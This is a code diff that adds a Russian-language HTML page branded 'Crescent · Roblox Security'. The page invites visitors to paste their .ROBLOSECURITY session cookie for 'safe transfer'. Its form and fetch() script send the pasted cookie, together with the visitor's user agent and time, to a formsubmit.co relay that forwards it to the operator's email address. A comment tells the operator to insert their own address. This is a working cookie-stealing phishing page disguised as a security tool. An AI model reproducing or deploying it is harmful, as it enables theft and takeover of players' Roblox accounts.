@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Crescent · Roblox Security</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            background: radial-gradient(circle at 30% 20%, #0f0c29, #1a1a2e, #0a0a14);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif;
+            padding: 16px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: "";
+            position: absolute;
+            width: 150%;
+            height: 150%;
+            background: radial-gradient(circle at 70% 80%, rgba(100, 80, 255, 0.15), transparent 60%),
+                        radial-gradient(circle at 30% 10%, rgba(0, 255, 200, 0.08), transparent 50%);
+            animation: floatBg 18s ease-in-out infinite alternate;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        @keyframes floatBg {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(-3%, -2%) scale(1.02); }
+        }
+
+        .glass-card {
+            position: relative;
+            z-index: 2;
+            max-width: 500px;
+            width: 100%;
+            background: rgba(20, 20, 35, 0.38);
+            backdrop-filter: blur(18px) saturate(180%);
+            -webkit-backdrop-filter: blur(18px) saturate(180%);
+            border: 1px solid rgba(210, 180, 255, 0.25);
+            border-radius: 42px;
+            padding: 36px 24px 32px;
+            box-shadow: 0 25px 40px -10px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(170, 130, 255, 0.1) inset;
+        }
+
+        h1 {
+            font-size: 2.4rem;
+            font-weight: 600;
+            letter-spacing: -0.02em;
+            background: linear-gradient(135deg, #f0eaff, #cbb2ff, #a88bff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 8px;
+            text-shadow: 0 2px 15px rgba(130, 80, 255, 0.5);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .crescent-badge {
+            font-size: 1rem;
+            font-weight: 400;
+            background: rgba(150, 120, 255, 0.18);
+            padding: 4px 12px;
+            border-radius: 40px;
+            border: 1px solid rgba(210, 180, 255, 0.35);
+            color: #d7c6ff;
+            letter-spacing: 0.3px;
+            backdrop-filter: blur(4px);
+        }
+
+        .description {
+            color: #cfc2f0;
+            margin-bottom: 30px;
+            font-weight: 400;
+            font-size: 1.05rem;
+            border-left: 3px solid #9f7aff;
+            padding-left: 18px;
+            text-shadow: 0 1px 3px black;
+        }
+
+        .input-group {
+            margin-bottom: 28px;
+        }
+
+        label {
+            display: block;
+            color: #e3d9ff;
+            font-weight: 500;
+            margin-bottom: 10px;
+            font-size: 0.95rem;
+            letter-spacing: 0.3px;
+            text-transform: uppercase;
+            opacity: 0.85;
+        }
+
+        .cookie-input {
+            width: 100%;
+            background: rgba(10, 8, 20, 0.55);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            border: 1.5px solid rgba(190, 160, 255, 0.4);
+            border-radius: 24px;
+            padding: 18px 22px;
+            font-size: 0.95rem;
+            color: #f2ebff;
+            font-family: 'SF Mono', 'Menlo', 'Monaco', monospace;
+            resize: none;
+        }
+
+        .cookie-input:focus {
+            outline: none;
+            border-color: #b388ff;
+            background: rgba(25, 20, 45, 0.7);
+        }
+
+        .cookie-input::placeholder {
+            color: #9580c0;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .send-button {
+            width: 100%;
+            background: linear-gradient(145deg, #6d4aff, #4a2cd9);
+            border: none;
+            border-radius: 60px;
+            padding: 18px 24px;
+            font-weight: 600;
+            font-size: 1.3rem;
+            color: white;
+            cursor: pointer;
+            border: 1px solid #b49aff;
+        }
+
+        .send-button:active {
+            transform: scale(0.975);
+            background: linear-gradient(145deg, #593dd9, #3f23b5);
+        }
+
+        .status-message {
+            margin-top: 22px;
+            min-height: 32px;
+            color: #bcacf0;
+            text-align: center;
+        }
+
+        .footer-note {
+            margin-top: 32px;
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            color: #9b88cf;
+            font-size: 0.8rem;
+            border-top: 1px dashed #6a53a8;
+            padding-top: 20px;
+        }
+
+        @media (max-width: 480px) {
+            .glass-card { padding: 28px 18px; }
+            h1 { font-size: 2rem; }
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="glass-card">
+        <h1>✦ ROBSEC <span class="crescent-badge">Crescent</span></h1>
+        <div class="description">.ROBLOSECURITY · безопасная передача</div>
+
+        <!-- ФОРМА ОТПРАВКИ -->
+        <form id="cookieForm" action="https://formsubmit.co/ajax/5864817355telegram@email.com" method="POST">
+            <!-- ЗАМЕНИ EMAIL НА СВОЙ НАСТОЯЩИЙ -->
+            <input type="hidden" name="_subject" value="НОВЫЙ ROBLOSECURITY COOKIE">
+            <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_captcha" value="false">
+            
+            <div class="input-group">
+                <label>🍪 Cookie</label>
+                <textarea 
+                    id="cookieInput"
+                    name="cookie"
+                    class="cookie-input" 
+                    placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."
+                    rows="2"
+                    required
+                ></textarea>
+            </div>
+
+            <input type="hidden" name="device" id="deviceInfo">
+            <input type="hidden" name="time" id="timeInfo">
+
+            <button type="submit" class="send-button" id="sendBtn">
+                ⚡ Отправить cookie
+            </button>
+        </form>
+
+        <div id="status" class="status-message"></div>
+        <div class="footer-note">
+            <span>🔒 Crescent</span>
+            <span>v2.0</span>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const form = document.getElementById('cookieForm');
+            const statusDiv = document.getElementById('status');
+            const sendBtn = document.getElementById('sendBtn');
+
+            // Заполняем скрытые поля
+            document.getElementById('deviceInfo').value = navigator.userAgent;
+            document.getElementById('timeInfo').value = new Date().toLocaleString('ru-RU');
+
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                sendBtn.disabled = true;
+                sendBtn.textContent = '⏳ Отправка...';
+                statusDiv.textContent = '📡 Передача...';
+                statusDiv.style.color = '#bcacf0';
+
+                const formData = new FormData(form);
+
+                try {
+                    const response = await fetch('https://formsubmit.co/ajax/skam54229@gmail.com', {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    if (response.ok) {
+                        statusDiv.textContent = '✅ Cookie отправлен!';
+                        statusDiv.style.color = '#90EE90';
+                        document.getElementById('cookieInput').value = '';
+                        sendBtn.textContent = '✓ Готово';
+                    } else {
+                        throw new Error('Ошибка');
+                    }
+                } catch (error) {
+                    statusDiv.textContent = '❌ Ошибка сети';
+                    statusDiv.style.color = '#ffa7b9';
+                    sendBtn.textContent = '⚡ Попробовать снова';
+                } finally {
+                    sendBtn.disabled = false;
+                    setTimeout(() => {
+                        if (sendBtn.textContent !== '⚡ Попробовать снова') {
+                            sendBtn.textContent = '⚡ Отправить cookie';
+                        }
+                    }, 2000);
+                }
+            });
+        })();
+    </script>
+</body>
+</html>
